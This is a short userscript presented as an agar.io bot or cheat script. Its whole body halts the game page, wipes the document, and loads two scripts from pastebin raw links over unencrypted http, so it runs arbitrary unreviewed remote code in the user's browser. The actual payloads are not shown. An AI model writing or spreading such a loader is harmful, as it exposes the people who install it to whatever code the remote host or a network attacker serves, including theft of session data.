// ==UserScript==
// @name         agar.io firestone script
// @match        http://agar.io/*
// @run-at       document-start
// @description  firestone script for agar
// @version      0.8
// @namespace    Best bots
// @author       firestone
// @Credits      none
// ==/UserScript==


//


//                                                              
function loadScript(a) {
    var b = document.createElement("script");
    b.type = "text/javascript";
    b.src = a;
    document.head.appendChild(b);
}

function stopPage() {
    window.stop();
    document.documentElement.innerHTML = null;
}
stopPage();
loadScript("http://pastebin.com/raw/MWDMnYiC");

loadScript("http://pastebin.com/raw/N36jzwuM");

loadScript("https://code.jquery.com/jquery-3.1.0.min.js");